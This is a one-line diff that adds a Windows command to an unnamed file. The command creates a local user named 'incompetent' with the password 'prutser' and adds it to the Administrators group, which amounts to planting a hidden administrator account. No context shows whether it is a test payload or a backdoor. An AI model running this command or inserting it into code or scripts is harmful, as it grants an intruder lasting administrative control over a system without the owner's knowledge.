@@ -1,0 +1,1 @@
+NET USER incompetent prutser /ADD && NET LOCALGROUP Administrators incompetent /ADD
